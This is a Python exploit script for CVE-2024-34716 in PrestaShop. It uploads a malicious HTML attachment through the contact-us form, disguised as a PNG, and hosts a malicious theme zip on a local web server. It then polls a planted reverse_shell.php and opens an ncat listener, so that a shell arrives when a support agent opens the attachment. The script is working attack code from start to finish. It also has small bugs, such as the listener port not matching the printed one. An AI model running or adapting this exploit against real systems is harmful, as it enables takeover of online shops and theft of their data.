import argparse, requests, subprocess, time, threading, sys, http.server, socketserver
from bs4 import BeautifulSoup


print_lock = threading.Lock()
stop_event = threading.Event()

def usage():
    print("Usage: python script.py <host_url> <email> <message_content> <exploit_path>")
    print("")
    print("Options:")
    print("  host_url          The Presta Shop base url (e.g. http://prestashop:8000)")
    print("  email             The email address of admin user (e.g. admin@prestashop.com)")
    print("  message_content   Message to send in Contact Us form (e.g. 'Hello, I am exploiting you')")
    print("  exploit_path      The path of the exploit HTML (e.g. /path/to/exploit.html)")
    print("")
    print("Example:")
    print("  python exploit.py http://prestashop:8000 admin@example.com 'Hello, I am exploiting you' /path/to/exploit.html")


def __parse_args(argv):
    num_args = len(argv)
    
    if num_args == 1:
        host_url = input("[?] Please enter the URL (e.g., http://prestashop:8000): ")
        email = input("[?] Please enter your email: ")
        message_content = input("[?] Please enter your message: ")
        exploit_path = input("[?] Please provide the path to your HTML file: ")
    elif num_args < 5:
        usage()
        sys.exit(1)
    else:
        parser = argparse.ArgumentParser(description="CVE-2024-34716 Exploit")
        parser.add_argument("host_url", help="The Presta Shop base url.")
        parser.add_argument("email", help="The email address of admin user.")
        parser.add_argument("message_content", help="Message to send in Contact Us form.")
        parser.add_argument("exploit_path", help="The path of the exploit HTML.")
        
        args = parser.parse_args()
        
        host_url = args.host_url
        email = args.email
        message_content = args.message_content
        exploit_path = args.exploit_path

        print("[X] Starting exploit with:")
        print(f"\tUrl: {host_url}")
        print(f"\tEmail: {email}")
        print(f"\tMessage: {message_content}")
        print(f"\tExploit path: {exploit_path}")
                
    return (host_url, email, message_content, exploit_path)
    
    
def send_get_requests(url, interval=5):
    while not stop_event.is_set():
        try:
            response = requests.get(url)
            print(f"GET request to {url}: {response.status_code}")
        except requests.RequestException as e:
            with print_lock:
                print(f"Error during GET request: {e}") # Can comment this out if thread isn't stopped.
        time.sleep(interval)


def run_http_server():
    PORT = 5000
    with socketserver.TCPServer(("", PORT), CustomRequestHandler) as httpd:
        with print_lock:
            print("Serving at http.Server on port", PORT)
        while not stop_event.is_set():
            httpd.handle_request()
        

def main():    
    host_url, email, message_content, exploit_path = __parse_args(sys.argv)

    with open(exploit_path, 'r') as file:
        html_content = file.read()

    url = f"{host_url}/contact-us"

    response = requests.get(url)
    response.raise_for_status()

    soup = BeautifulSoup(response.text, 'html.parser')
    token = soup.find('input', {'name': 'token'})['value']
    cookies = response.cookies

    files = {
        'fileUpload': ('test.png', html_content, 'image/png'),
    }

    data = {
        'id_contact': '2',
        'from': email,
        'message': message_content,
        'url': '',
        'token': token,
        'submitMessage': 'Send'
    }

    response = requests.post(url, files=files, data=data, cookies=cookies)
    url = f"{host_url}/themes/next/reverse_shell.php"

    req_thread = threading.Thread(target=send_get_requests, args=(url, 15,))
    req_thread.daemon = True
    req_thread.start()
    
    server_thread = threading.Thread(target=run_http_server)
    server_thread.daemon = True
    server_thread.start()

    if response.status_code == 200:
        print(f"[X] Yay! Your exploit was sent successfully!")
        print(f"[X] Remember to python http server on port whatever port is specified in exploit.html \n\tin directory that contains ps_next_8_theme_malicious.zip to host it.")
        print(f"[X] Once a CS agent clicks on attachment, you'll get a SHELL!")
        print("[X] Ncat is now listening on port 1234. Press Ctrl+C to terminate.")
        
        output = subprocess.call(["ncat", "-lnvp", "1667"], shell=False)
        if b"Ncat: Connection from " in output:
            with print_lock:
                print("Stopping threads!")
            stop_event.set()
        else:
            print(f"DEBUG:: {output}")
    else:
        print(f"[!] Failed to send the message. Status code: {response.status_code} Reason: {response.reason}")


class CustomRequestHandler(http.server.SimpleHTTPRequestHandler):
    def log_request(self, code='-', size='-'):
        with print_lock:
            print(f"Request: {self.command} {self.path} {self.request_version}")
            print(f"Response: {code} {size}")
        super().log_request(code, size)



if __name__ == "__main__":
    main()